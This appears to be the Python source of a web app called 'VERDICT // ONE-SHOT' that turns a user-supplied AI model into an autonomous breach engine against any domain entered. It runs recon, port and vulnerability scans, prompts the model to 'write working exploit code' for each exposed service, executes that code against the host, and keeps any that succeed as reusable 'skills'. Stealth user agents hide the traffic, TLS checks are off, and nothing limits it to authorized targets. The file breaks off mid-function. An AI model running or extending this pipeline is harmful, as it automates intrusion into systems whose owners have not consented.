"""
VERDICT // ONE-SHOT — all-in-one breach platform with Open Harness UI.
- Enter API (base URL + key), discover models, pick one
- Enter scope (target domain/URL)
- Enter prompt (what you want it to do)
- Press RUN — AI does everything: recon, subdomain discovery, port scan,
  S3 bucket check, JS analysis, breach assessment, report generation
- Download report as .md file
- Events stream live to the Open Harness dashboard

Install: pip install fastapi uvicorn openai requests sse-starlette
Run:      uvicorn app:app --port 8080
"""

import json, os, uuid, hashlib, re, threading, time, socket, subprocess, urllib.request, urllib.error, urllib.parse, ssl, html as html_mod, asyncio, concurrent.futures, shutil, traceback, textwrap, inspect, random, string, ipaddress, math
from datetime import datetime, timezone
from pathlib import Path
from markdown import markdown as md
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import stealth

app = FastAPI(title="MRBOOM ONE-SHOT")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

DATA_DIR = os.environ.get("DRDOOM_DATA_DIR") or os.path.dirname(os.path.abspath(__file__))

# Optional shared-secret auth: set MRBOOM_API_KEY to require X-API-Key (or ?token=) on all API + SSE routes.
AUTH_KEY = os.environ.get("MRBOOM_API_KEY", "")

@app.middleware("http")
async def _auth_gate(request: Request, call_next):
    if AUTH_KEY:
        p = request.url.path
        if p.startswith("/api/") or p == "/events":
            key = request.headers.get("x-api-key") or request.query_params.get("token") or ""
            if key != AUTH_KEY:
                return JSONResponse({"detail": "unauthorized"}, status_code=401)
    return await call_next(request)

@app.on_event("startup")
async def _startup():
    global _main_loop
    _main_loop = asyncio.get_running_loop()
    stealth.init()
DB = {}  # engagement_id -> state
HISTORY_DIR = os.path.join(DATA_DIR, "scan_history")
os.makedirs(HISTORY_DIR, exist_ok=True)

def _session_code():
    return ''.join(random.choices(string.ascii_uppercase, k=9))

# ─── SELF-GROWING SKILL SYSTEM ─────────────────────────────────────
# Skills are AI-generated Python functions saved to skills/<name>.py,
# with metadata in skills/index.json. The agent writes a skill when no
# existing tool works against a service. If the code returns success,
# the skill is saved permanently and reused on future runs.

SKILLS_DIR = Path(DATA_DIR) / "skills"
SKILLS_DIR.mkdir(exist_ok=True)
SKILL_INDEX_PATH = SKILLS_DIR / "index.json"

def _load_skill_index() -> dict:
    try:
        return json.loads(SKILL_INDEX_PATH.read_text(encoding="utf-8"))
    except (FileNotFoundError, json.JSONDecodeError):
        return {"skills": []}

def _save_skill_index(idx: dict):
    SKILL_INDEX_PATH.write_text(json.dumps(idx, indent=2, default=str), encoding="utf-8")

def _load_skill_source(name: str) -> str:
    if not _valid_skill_name(name):
        return None
    path = SKILLS_DIR / f"{name}.py"
    if not path.exists():
        return None
    return path.read_text(encoding="utf-8")

def _valid_skill_name(name: str) -> bool:
    return bool(name) and re.fullmatch(r"[A-Za-z0-9_.-]+", name or "") and ".." not in (name or "")

def _load_skill_module(name: str):
    """Dynamically import skills/<name>.py and return the module."""
    import importlib.util
    path = SKILLS_DIR / f"{name}.py"
    if not path.exists():
        return None
    spec = importlib.util.spec_from_file_location(f"skills_{name}", str(path))
    if spec is None or spec.loader is None:
        return None
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
        return mod
    except Exception:
        return None

def get_matching_skills(host: str, port: int, service: str) -> list:
    """Return skills that match the given host/port/service context."""
    idx = _load_skill_index()
    matches = []
    for s in idx.get("skills", []):
        score = 0
        # Exact port match
        if port in s.get("target_ports", []):
            score += 3
        # Service name match (substring)
        if any(svc.lower() in service.lower() for svc in s.get("target_services", [])):
            score += 2
        if any(svc.lower() in s.get("target_services", []) for svc in service.lower().split("/")[0].split("-")):
            score += 1
        # Port range match
        for pr in s.get("port_ranges", []):
            if isinstance(pr, list) and len(pr) == 2 and pr[0] <= port <= pr[1]:
                score += 2
        if score > 0:
            matches.append((score, s))
    matches.sort(key=lambda x: -x[0])
    return [m[1] for m in matches]

SKILL_WRAPPER = r'''
import sys, json, traceback, resource
def _run():
    try:
        resource.setrlimit(resource.RLIMIT_CPU, (30, 30))
    except Exception:
        pass
    try:
        resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
    except Exception:
        pass
    skill_file, host, port, timeout = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
    g = {}
    try:
        with open(skill_file, encoding="utf-8") as f:
            src = f.read()
        exec(compile(src, "skill", "exec"), g)
    except Exception as e:
        print(json.dumps({"success": False, "error": "skill compile error: " + repr(e)})); return
    f = g.get("run")
    if not callable(f):
        print(json.dumps({"success": False, "error": "no run() function"})); return
    try:
        r = f(host=host, port=port, timeout=timeout)
        if isinstance(r, dict):
            print(json.dumps(r, default=str))
        else:
            print(json.dumps({"success": bool(r), "data": str(r)}))
    except Exception as e:
        print(json.dumps({"success": False, "error": repr(e), "traceback": traceback.format_exc()}))
_run()
'''

def try_skill(skill_meta: dict, host: str, port: int, timeout: int = 30) -> dict:
    """Execute a skill's run() in a sandboxed subprocess (CPU/mem/time limits)."""
    import sys as _sys, tempfile as _tmp
    src = _load_skill_source(skill_meta["name"])
    if not src:
        return {"success": False, "error": "skill source not found"}
    skill_file = _tmp.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
    skill_file.write(src)
    skill_file.close()
    wrapper_file = _tmp.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
    wrapper_file.write(SKILL_WRAPPER)
    wrapper_file.close()
    try:
        proc = subprocess.run(
            [_sys.executable, wrapper_file.name, skill_file.name, str(host), str(port), str(timeout)],
            capture_output=True, text=True, timeout=timeout + 15)
        out = (proc.stdout or "").strip()
        for line in reversed(out.splitlines()):
            line = line.strip()
            if line.startswith("{"):
                try:
                    return json.loads(line)
                except Exception:
                    continue
        return {"success": False, "error": "no result", "stderr": (proc.stderr or "")[-2000:]}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "skill timed out"}
    finally:
        for _p in (skill_file.name, wrapper_file.name):
            try:
                os.unlink(_p)
            except Exception:
                pass

def generate_skill(host: str, port: int, service: str, context: str,
                   base_url: str, model: str, api_key: str) -> dict:
    """Ask AI to write a Python function that breaches the given service."""
    prompt = f"""You are a penetration testing automation engine. Write a Python function that exploits or breaches the service described below.

TARGET:
  Host: {host}
  Port: {port}
  Service: {service}

CONTEXT (what we already know):
{context[:2000]}

Write a SINGLE Python function named `run` with this exact signature:

```python
def run(host: str, port: int, timeout: int = 30) -> dict:
    \"\"\"
    <one-line description of what this exploits>
    <detailed description: what kind of server/service this works on, 
     what vulnerability or misconfiguration it targets, 
     the exact conditions under which this works>
    \"\"\"
```

REQUIREMENTS:
- The function MUST be named `run` and take exactly `(host, port, timeout)` args.
- It must return a dict: {{"success": True/False, "data": <string or dict of results>, "evidence": <string of proof>}}
- Use ONLY standard library Python modules (socket, ssl, http.client, urllib, json, base64, re, subprocess, etc.)
- Do NOT import external packages (no requests, no pwntools, etc.)
- The function will be called by an automated pipeline. It must NOT crash on failure — return {{"success": False, "data": "", "evidence": ""}} instead.
- If you need to run a shell command, use subprocess.
- For network services, use socket or ssl sockets.
- For HTTP services, use urllib.request or http.client.
- Add proper error handling — wrap everything in try/except.
- The docstring (triple-quoted string) will be used as the skill's DESCRIPTION. Make it detailed: what kind of servers, what ports, what auth mechanism, what vulnerability, exactly when this skill applies.
- The code should be ready to execute as-is with no modifications needed.
- MAXIMUM 80 lines of code.

Return ONLY the Python code. No explanation, no markdown formatting outside the code block."""
    messages = [
        {"role": "system", "content": "You are a penetration testing code generator. Write working exploit code. Return ONLY valid Python."},
        {"role": "user", "content": prompt}
    ]
    response = call_model(base_url, model, api_key, messages, timeout=120)
    if response.startswith("AI_ERROR:"):
        return {"success": False, "error": response}
    # Extract code from markdown code block if present
    code_match = re.search(r"```(?:python)?\n(.*?)```", response, re.DOTALL)
    if code_match:
        code = code_match.group(1).strip()
    else:
        code = response.strip()
    # Parse the docstring for description
    desc_match = re.search(r'"""(.*?)"""', code, re.DOTALL)
    description = desc_match.group(1).strip() if desc_match else f"Exploit for {service} on port {port}"
    first_line = description.split(".")[0].strip() if description else service
    # Derive target services/ports from the context
    target_services = [service.split("-")[0].split("/")[0].lower()]
    target_ports = [port]
    # Generate a skill name
    safe_name = re.sub(r"[^a-z0-9]", "", service.split("-")[0].split("/")[0].lower()[:20] + f"_p{port}")
    if not safe_name:
        safe_name = f"skill_p{port}"
    # Check for duplicates
    idx = _load_skill_index()
    existing = [s for s in idx["skills"] if s["name"] == safe_name]
    if existing:
        safe_name = f"{safe_name}_{uuid.uuid4().hex[:4]}"
    skill_meta = {
        "name": safe_name,
        "description": description,
        "oneliner": first_line,
        "target_services": target_services,
        "target_ports": target_ports,
        "port_ranges": [],
        "created_at": datetime.now(timezone.utc).isoformat(),
        "success_count": 0,
        "author": "ai",
        "use_case": f"Automatically generated exploit for {service} on port {port}. {description[:200]}"
    }
    # Write the code file
    (SKILLS_DIR / f"{safe_name}.py").write_text(code, encoding="utf-8")
    # Register in index
    idx["skills"].append(skill_meta)
    _save_skill_index(idx)
    return {"success": True, "skill": skill_meta, "code": code}

def run_skill_generation_for_port(host: str, port: int, service: str, context_lines: list,
                                   base_url: str, model: str, api_key: str, eid: str) -> dict:
    """Full pipeline step: try existing skills first, then generate + test new one."""
    emit_ir = lambda etype, payload: _emit_ir(eid, etype, payload)
    # 1. Try matching existing skills
    matches = get_matching_skills(host, port, service)
    for skill in matches:
        emit_ir("tool.call", {"call_id": f"skill-{skill['name']}-{eid}", "name": f"skill: {skill['name']}", "target": f"{host}:{port}", "category": "exploit"})
        result = try_skill(skill, host, port)
        if result.get("success"):
            idx = _load_skill_index()
            for s in idx["skills"]:
                if s["name"] == skill["name"]:
                    s["success_count"] = s.get("success_count", 0) + 1
            _save_skill_index(idx)
            result_preview = str(result.get("data", ""))[:200]
            emit_ir("tool.result", {"call_id": f"skill-{skill['name']}-{eid}", "status": "ok", "result": f"skill {skill['name']} succeeded: {result_preview}"})
            return {"status": "exploited", "skill": skill["name"], "result": result}
        emit_ir("tool.result", {"call_id": f"skill-{skill['name']}-{eid}", "status": "empty", "result": f"skill {skill['name']} failed"})
    # 2. Generate a new skill if model available
    if not base_url or not model or not api_key:
        return {"status": "no_model", "skill": None}
    emit_ir("message", {"role": "assistant_thinking", "text": f"No existing skill works for {service} on {host}:{port}. Asking AI to craft a new exploit..."})
    gen = generate_skill(host, port, service, "\n".join(context_lines[-50:]), base_url, model, api_key)
    if not gen.get("success"):
        return {"status": "generation_failed", "skill": None, "error": gen.get("error", "unknown")}
    # 3. Test the generated skill
    emit_ir("tool.call", {"call_id": f"skill-new-{eid}", "name": f"new skill: {gen['skill']['name']}", "target": f"{host}:{port}", "category": "exploit"})
    result = try_skill(gen["skill"], host, port)
    if result.get("success"):
        idx = _load_skill_index()
        for s in idx["skills"]:
            if s["name"] == gen["skill"]["name"]:
                s["success_count"] = s.get("success_count", 0) + 1
        _save_skill_index(idx)
        emit_ir("message", {"role": "assistant", "text": f"✅ **New skill generated and verified!** `{gen['skill']['name']}` worked against {service} on {host}:{port}. Saved permanently."})
        emit_ir("tool.result", {"call_id": f"skill-new-{eid}", "status": "ok", "result": f"new skill {gen['skill']['name']} succeeded"})
        return {"status": "generated_and_exploited", "skill": gen["skill"], "result": result}
    emit_ir("tool.result", {"call_id": f"skill-new-{eid}", "status": "empty", "result": f"new skill {gen['skill']['name']} failed"})
    return {"status": "generated_but_failed", "skill": gen["skill"], "result": result}

def _emit_ir(eid: str, etype: str, payload: dict):
    """Helper to emit an event for a given engagement — works outside run_oneshot."""
    if eid not in DB:
        return
    eng = DB[eid]
    pair = {"harness": "skills", "model": "skill-engine"}
    ev = {
        "type": etype,
        "ts": datetime.now(timezone.utc).isoformat(),
        "source": {"pair": pair},
        "payload": payload,
        "task_id": eng.get("task_id", eid),
    }
    events_list = eng.setdefault("events", [])
    events_list.append(ev)
    eng["events"] = eng["events"][-200:]
    emit_sync("ir", ev)

def skill_stats() -> dict:
    idx = _load_skill_index()
    total = len(idx.get("skills", []))
    successes = sum(s.get("success_count", 0) for s in idx["skills"])
    return {"total_skills": total, "total_successes": successes, "skills": idx["skills"]}

def save_scan_history(eid):
    """Persist completed scan to disk as JSON."""
    if eid not in DB:
        return
    eng = DB[eid]
    record = {
        "id": eid,
        "code": eng.get("code", ""),
        "name": eng.get("name", ""),
        "scope": eng.get("scope", ""),
        "model": eng.get("model", ""),
        "prompt": eng.get("prompt", ""),
        "status": eng.get("status", ""),
        "report": eng.get("report", ""),
        "report_filename": eng.get("report_filename", ""),
        "completed_at": datetime.now(timezone.utc).isoformat(),
        "progress": eng.get("progress", ""),
        "events": eng.get("events", [])[-200:],
    }
    # Include BB findings if they exist
    for key in ["bb_takeover","bb_cors","bb_open_redirect","bb_injection","bb_webapp","bb_health_endpoints","bb_dirbust","bb_tech","secrets","pd_nuclei","missing_security_headers","wayback","bb_new_subdomains","api_endpoints","subdomains","ports","http","waf","csp","s3","origins","whois","dns","bb_origins","bb_login","bb_sourcemap","bb_wayback","bb_default_creds","bb_jwt","ai_0day_hypotheses","bb_api","bb_js","bb_waf","bb_openapi","bb_origin_retest","bb_cf_hunt","bb_attack","bb_ptt","bb_agentic","bb_validations","bb_fuzz","bb_agentic_findings"]:
        val = eng.get(key)
        if val:
            record[key] = val
    path = os.path.join(HISTORY_DIR, f"{eid}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(record, f, indent=2, default=str)

def load_scan_history():
    """Load all past scans from disk."""
    scans = []
    for fname in sorted(os.listdir(HISTORY_DIR), reverse=True):
        if not fname.endswith(".json"):
            continue
        path = os.path.join(HISTORY_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as f:
                scans.append(json.load(f))
        except:
            pass
    return scans

def delete_scan_history(eid):
    """Delete a past scan from disk."""
    path = os.path.join(HISTORY_DIR, f"{eid}.json")
    if os.path.exists(path):
        os.remove(path)
    # Also remove report file if it exists
    if eid in DB:
        rp = DB[eid].get("report_path", "")
        if rp and os.path.exists(rp):
            try: os.remove(rp)
            except: pass

# ─── CROSS-SCAN MEMORY ──────────────────────────────────────────────────
# Persistent per-target knowledge base: discoveries, probed endpoints, and
# known vulnerabilities accumulate across runs so every rescan starts from
# what previous scans already learned instead of a blank slate.

MEMORY_DIR = os.path.join(DATA_DIR, "scan_memory")

def _memory_path(domain):
    return os.path.join(MEMORY_DIR, f"{domain.replace('.', '_').replace('/', '_')}_memory.json")

def _load_scan_memory(domain=""):
    """Load the knowledge base accumulated for a target across prior scans."""
    api_eps, fuzz_paths, openapi_eps, origins, findings, validations, probes = [], [], [], [], [], [], []
    paths = [_memory_path(domain), _memory_path(apex_domain(domain))] if domain else []
    for p in paths:
        try:
            if not os.path.exists(p): continue
            with open(p, "r", encoding="utf-8") as f:
                mem = json.load(f)
            api_eps.extend(mem.get("api_endpoints", []))
            fuzz_paths.extend(mem.get("fuzz_paths", []))
            openapi_eps.extend(mem.get("openapi_endpoints", []))
            origins.extend(mem.get("origins", []))
            findings.extend(mem.get("findings", []))
            validations.extend(mem.get("validations", []))
            probes.extend(mem.get("probes", []))
        except Exception:
            continue
    # dedupe while keeping order
    return {
        "api_endpoints": list(dict.fromkeys(api_eps))[:120],
        "fuzz_paths": list(dict.fromkeys(fuzz_paths))[:120],
        "openapi_endpoints": list(dict.fromkeys(openapi_eps))[:80],
        "origins": list(dict.fromkeys(origins))[:30],
        "findings": list({(f.get('type',''), f.get('url','')): f for f in findings}.values())[:80],
        "validations": list({(f.get('type',''), f.get('url','')): f for f in validations}.values())[:80],
        "probes": probes[-40:],
    }

def save_scan_memory(domain, data):
    """Merge this run's discoveries into the per-target knowledge base."""
    try:
        os.makedirs(MEMORY_DIR, exist_ok=True)
        path = _memory_path(domain)
        prev = {"api_endpoints": [], "fuzz_paths": [], "openapi_endpoints": [],
                "origins": [], "findings": [], "validations": [], "probes": []}
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    prev = json.load(f)
            except Exception:
                pass
        now_ts = datetime.now(timezone.utc).isoformat()
        for k, getter in [
            ("api_endpoints", lambda: data.get("api_endpoints", [])),
            ("openapi_endpoints", lambda: [e for r in (data.get("bb_openapi") or []) if r.get("kind") == "openapi_paths" for e in (r.get("endpoints") or [])]),
            ("origins", lambda: [o.get("ip") for o in (data.get("bb_origins") or []) if o.get("confirmed") and o.get("ip")]),
        ]:
            prev[k] = list(dict.fromkeys(list(prev.get(k, [])) + list(getter())))[:200]
        for k in ("findings", "validations"):
            src = data.get(k, [])
            merged = list(prev.get(k, []))
            merged += [{**f, "first_seen": now_ts} for f in src if (f.get('type',''), f.get('url','')) not in {(x.get('type',''), x.get('url','')) for x in merged}]
            prev[k] = merged[-120:]
        # probed agentic endpoints + fuzz results
        fuzz_seen = [], 
        prev["probes"] = list(prev.get("probes", [])) + [
            {"iter": s.get("iter"), "url": s.get("url"), "outcome": s.get("outcome"),
             "status": s.get("status"), "first_seen": now_ts}
            for s in (data.get("bb_agentic") or []) if s.get("url")
        ]
        prev["probes"] = prev["probes"][-80:]
        prev["fuzz_paths"] = list(dict.fromkeys(list(prev.get("fuzz_paths", [])) + [
            (f.get("url"), f.get("status"), f.get("size", 0)) for f in (data.get("bb_fuzz") or []) if f.get("url")
        ]))[:200]
        prev["last_scan"] = now_ts
        prev["runs"] = int(prev.get("runs", 0)) + 1
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(prev, f, indent=2, default=str)
        os.replace(tmp, path)
        return True
    except Exception:
        return False

def _memory_prompt(domain, data):
    """Build the 'known from previous scans' block injected into agentic prompts."""
    mem = data.get("scan_memory") or {}
    lines = []
    findings = mem.get("findings", [])
    probes = mem.get("probes", [])
    api_eps = mem.get("api_endpoints", [])
    if findings or probes or api_eps:
        lines.append("PREVIOUS SCAN MEMORY (from earlier engagements on this target — trust but re-verify):")
        if findings:
            lines.append("Known vulnerabilities previously confirmed:")
            for f in findings[-25:]:
                lines.append(f"- {f.get('severity','?')}: {f.get('type','?')} @ {f.get('url','?')} ({str(f.get('evidence',''))[:90]})")
        if api_eps:
            lines.append("Previously discovered API/spec endpoints:")
            for e in api_eps[-25:]:
                lines.append(f"- {e}")
        if probes:
            seen_ok = [p for p in probes if p.get("outcome") in ("api-open", "ok", "auth-bypass")]
            if seen_ok:
                lines.append("Previously probed endpoints that responded (worth re-visiting / deepening):")
                for p in seen_ok[-15:]:
                    lines.append(f"- {p.get('url','?')} -> {p.get('outcome','?')} (HTTP {p.get('status')})")
    return "\n".join(lines)

# ─── SSE MANAGER ─────────────────────────────────────────────────────────

class SSEManager:
    def __init__(self):
        self._clients = set()  # (queue, eid_or_None)
        self._lock = asyncio.Lock()

    async def register(self, queue: asyncio.Queue, eid: str = None):
        async with self._lock:
            self._clients.add((queue, eid))

    async def unregister(self, queue: asyncio.Queue):
        async with self._lock:
            self._clients = {(q, e) for q, e in self._clients if q is not queue}

    def _matches(self, data: dict, eid: str) -> bool:
        if not eid:
            return True
        task_id = data.get("task_id") or data.get("eid") or ""
        return str(task_id) == str(eid)

    async def broadcast(self, event: str, data: object):
        payload = f"event: {event}\ndata: {json.dumps(data, default=str)}\n\n"
        d = data if isinstance(data, dict) else {}
        async with self._lock:
            dead = set()
            for q, eid in self._clients:
                if not self._matches(d, eid):
                    continue
                try:
                    await q.put(payload)
                except:
                    dead.add(q)
            self._clients = {(q, e) for q, e in self._clients if q not in dead}

sse = SSEManager()
meta_state = {"goal": None, "status": "idle", "envelope": {"budget_usd_max": 2.0}, "task_id": None}

_main_loop = None  # set during startup

def emit_sync(event: str, data: object):
    """Fire-and-forget sync emit — runs in pipeline threads."""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = _main_loop
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(sse.broadcast(event, data), loop)

# ─── MODELS ─────────────────────────────────────────────────────

def fetch_models(base_url, api_key):
    """Fetch available models from an OpenAI-compatible endpoint."""
    candidates = [base_url.rstrip("/") + "/models"]
    # Try /v1/models too if the base URL doesn't already end with /v1
    if not base_url.rstrip("/").endswith("/v1"):
        candidates.append(base_url.rstrip("/") + "/v1/models")
    for url in candidates:
        try:
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {api_key}", "User-Agent": stealth.ua()})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            data = json.loads(resp.read().decode())
            models = [m["id"] for m in data.get("data", []) if m.get("id")]
            if models:
                return sorted(models)
        except Exception:
            continue
    # All attempts failed — return empty so UI shows a clear message
    return ["error: Could not reach any model endpoint (" + "; ".join(candidates) + ")"]

def _parse_maybe_ssd_json(raw):
    """Parse a JSON response, tolerating trailing SSE framing like 'data: [DONE]'."""
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    try:
        start = raw.find("{")
        if start == -1:
            return None
        end = raw.rfind("}")
        return json.loads(raw[start:end + 1])
    except Exception:
        return None

def _chat_urls(base_url):
    """Return candidate /chat/completions URLs, trying both /v1 and bare."""
    base = base_url.rstrip("/")
    urls = [base + "/chat/completions"]
    if not base.endswith("/v1"):
        urls.append(base + "/v1/chat/completions")
    return urls

def check_model(base_url, model, api_key):
    """Check if a model is available and responsive with a tiny ping."""
    for url in _chat_urls(base_url):
        try:
            body = json.dumps({"model": model, "messages": [{"role": "user", "content": "ping"}], "max_tokens": 1}).encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json", "Authorization": f"Bearer {api_key}", "User-Agent": stealth.ua()}, method="POST")
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            raw = resp.read().decode()
            data = _parse_maybe_ssd_json(raw)
            if data and "choices" in data:
                return True
        except urllib.error.HTTPError as e:
            if e.code in (404, 405):
                continue
            if e.code == 400:
                try:
                    err = json.loads(e.read().decode())
                    emsg = str(err).lower()
                    if "not found" in emsg or "not loaded" in emsg or "does not exist" in emsg:
                        return False
                except: pass
        except Exception:
            continue
    return False

def call_model(base_url, model, api_key, messages, timeout=120):
    """Call an OpenAI-compatible chat completion.

    Strategy: try once WITH chat_template_kwargs (disable thinking → direct
    content on vLLM/deepseek-style servers), then retry WITHOUT it (OpenAI
    rejects unknown fields). Prefers a non-empty `content` reply."""
    last_err = None
    _p = (base_url or "").lower()
    _supports_template_kwargs = any(k in _p for k in ("deepseek", "dashscope", "vllm", "qwen", "moonshot", "kimi", "zhipu", "bigmodel", "ollama", "tunnel", "cloudflared", "abc-"))
    variants = [True, False] if _supports_template_kwargs else [False, True]
    for url in _chat_urls(base_url):
        for with_kwargs in variants:
            try:
                _extra = {"chat_template_kwargs": {"enable_thinking": False}} if with_kwargs else {}
                body = json.dumps({
                    "model": model,
                    "messages": messages,
                    "temperature": 0.3,
                    "max_tokens": 8192,
                    **_extra
                }).encode()
                req = urllib.request.Request(url, data=body, headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {api_key}",
                    "User-Agent": stealth.ua()
                }, method="POST")
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
                raw = resp.read().decode()
                data = _parse_maybe_ssd_json(raw)
                if not data or "choices" not in data:
                    continue
                msg = data["choices"][0]["message"]
                content = msg.get("content") or ""
                reasoning = msg.get("reasoning_content") or ""
                if content and content.strip():
                    return content.strip()
                if reasoning and with_kwargs:
                    return reasoning.strip()
            except Exception as e:
                last_err = f"{e}"
                continue
    return f"AI_ERROR: {last_err}"

# ─── PD TOOL INTEGRATION ─────────────────────────────────────────

TOOL_BIN = {}  # cache: name -> path or None
def pd_tool(name):
    if name not in TOOL_BIN:
        found = shutil.which(name)
        if not found:
            for d in ("/home/nil/go/bin", "/usr/local/bin", os.path.expanduser("~/.local/bin"), os.path.join(DATA_DIR, ".venv", "bin")):
                cand = os.path.join(d, name)
                if os.path.isfile(cand) and os.access(cand, os.X_OK):
                    found = cand
                    break
        TOOL_BIN[name] = found
    return TOOL_BIN[name]

def run_pd(name, args, timeout=30):
    """Run a PD tool, return (ok, stdout) or (False, error)."""
    bin_path = pd_tool(name)
    if not bin_path:
        return False, f"{name} not installed"
    try:
        r = subprocess.run([bin_path] + args, capture_output=True, text=True, timeout=timeout)
        if r.returncode == 0:
            return True, r.stdout.strip()
        return False, r.stderr.strip() or f"exit {r.returncode}"
    except subprocess.TimeoutExpired:
        return False, "timeout"
    except Exception as e:
        return False, str(e)

def pd_subfinder(domain, timeout=30):
    """Run subfinder for passive subdomain enumeration."""
    ok, out = run_pd("subfinder", ["-d", domain, "-silent"], timeout)
    if not ok or not out: return None
    return sorted(set(out.strip().splitlines()))

def pd_dnsx(domain, timeout=20):
    """Run dnsx for full DNS record enumeration."""
    ok, out = run_pd("dnsx", ["-d", domain, "-a", "-aaaa", "-mx", "-ns", "-txt", "-silent"], timeout)
    if not ok or not out: return None
    records = {"A": [], "AAAA": [], "MX": [], "NS": [], "TXT": []}
    for line in out.strip().splitlines():
        parts = line.split()
        if len(parts) >= 2:
            rtype = parts[0].upper()
            val = parts[-1]
            for k in records:
                if rtype.startswith(k): records[k].append(val)
    return records

def pd_asnmap(domain, timeout=20):
    """Run asnmap for ASN / network range mapping."""
    ok, out = run_pd("asnmap", ["-d", domain, "-silent"], timeout)
    if not ok or not out: return None
    ranges = []
    for line in out.strip().splitlines():
        line = line.strip()
        if line and "/" in line: ranges.append(line)
    return ranges

def pd_uncover(domain, timeout=25):
    """Run uncover for passive host discovery from search engines."""
    ok, out = run_pd("uncover", ["-q", domain, "-silent"], timeout)
    if not ok or not out: return None
    hosts = []
    for line in out.strip().splitlines():
        line = line.strip()
        if line and not line.startswith("["): hosts.append(line)
    return hosts

def pd_httpx(targets, timeout=45):
    """Run httpx for HTTP probing with JSON output."""
    if not targets: return None
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt") as f:
        f.write("\n".join(targets))
        tmp = f.name
    try:
        ok, out = run_pd("httpx", ["-l", tmp, "-json", "-silent"] + stealth.pd_flags("httpx"), timeout)
        if not ok or not out: return None
        results = {}
        for line in out.strip().splitlines():
            try:
                j = json.loads(line)
                url = j.get("url", "")
                results[url] = {
                    "status": j.get("status_code", 0),
                    "server": j.get("webserver", ""),
                    "title": j.get("title", ""),
                    "tech": j.get("tech", []),
                    "csp": j.get("csp", {}).get("policy", "") if isinstance(j.get("csp"), dict) else str(j.get("csp", "")),
                    "cloudflare": j.get("cdn_name", "") == "cloudflare",
                    "content_type": j.get("content_type", ""),
                    "content_length": j.get("content_length", 0),
                    "cdn": j.get("cdn_name", ""),
                    "response_time": j.get("response_time", ""),
                }
            except: pass
        return results if results else None
    finally:
        try: os.unlink(tmp)
        except: pass

def pd_naabu(domain, timeout=60):
    """Run naabu for fast port scanning."""
    ok, out = run_pd("naabu", ["-host", domain, "-silent", "-top-ports", "100"] + stealth.pd_flags("naabu"), timeout)
    if not ok or not out: return None
    ports = {}
    for line in out.strip().splitlines():
        line = line.strip()
        if not line: continue
        # naabu outputs like: host:port
        if ":" in line:
            host, port = line.rsplit(":", 1)
            ports.setdefault(host, []).append(int(port))
    return ports

def pd_katana(url, timeout=30):
    """Run katana for web crawling / endpoint discovery."""
    ok, out = run_pd("katana", ["-u", url, "-silent", "-d", "2", "-k", "-jc"], timeout)
    if not ok or not out: return None
    eps = set()
    for line in out.strip().splitlines():
        line = line.strip()
        if line: eps.add(line)
    return sorted(eps)

def pd_tlsx(targets, timeout=30):
    """Run tlsx for TLS certificate analysis."""
    if not targets: return None
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt") as f:
        f.write("\n".join(targets))
        tmp = f.name
    try:
        ok, out = run_pd("tlsx", ["-l", tmp, "-json", "-silent", "-san", "-cn", "-expired"], timeout)
        if not ok or not out: return None
        certs = []
        for line in out.strip().splitlines():
            try: certs.append(json.loads(line))
            except: pass
        return certs
    finally:
        try: os.unlink(tmp)
        except: pass

def pd_nuclei(targets, timeout=45):
    """Run nuclei for vulnerability scanning."""
    if not targets: return None
    findings = []
    for t in targets[:3]:
        ok, out = run_pd("nuclei", ["-u", t, "-json", "-silent", "-severity", "low,medium,high,critical", "-t", "http/cves", "-t", "http/misconfiguration", "-t", "http/exposed-panels"] + stealth.pd_flags("nuclei"), timeout)
        if ok and out:
            for line in out.strip().splitlines():
                try:
                    j = json.loads(line)
                    findings.append({
                        "template": j.get("template-id", ""),
                        "name": j.get("info", {}).get("name", ""),
                        "severity": j.get("info", {}).get("severity", ""),
                        "url": j.get("host", ""),
                        "matched": j.get("matched-at", ""),
                        "extracted": j.get("extracted-results", []),
                    })
                except: pass
    return findings if findings else None

def pd_urlfinder(domain, timeout=30):
    """Run urlfinder for passive URL gathering."""
    ok, out = run_pd("urlfinder", ["-d", domain, "-silent"], timeout)
    if not ok or not out: return None
    urls = set()
    for line in out.strip().splitlines():
        line = line.strip()
        if line and "://" in line: urls.add(line)
    return sorted(urls)

def pd_assetfinder(domain, timeout=30):
    """Run assetfinder for additional passive subdomain enumeration."""
    ok, out = run_pd("assetfinder", ["-subs-only", domain], timeout)
    if not ok or not out: return None
    subs = set()
    for line in out.strip().splitlines():
        line = line.strip()
        if line and "." in line:
            subs.add(line)
    return sorted(subs)

def pd_ffuf(url, wordlist=None, timeout=40):
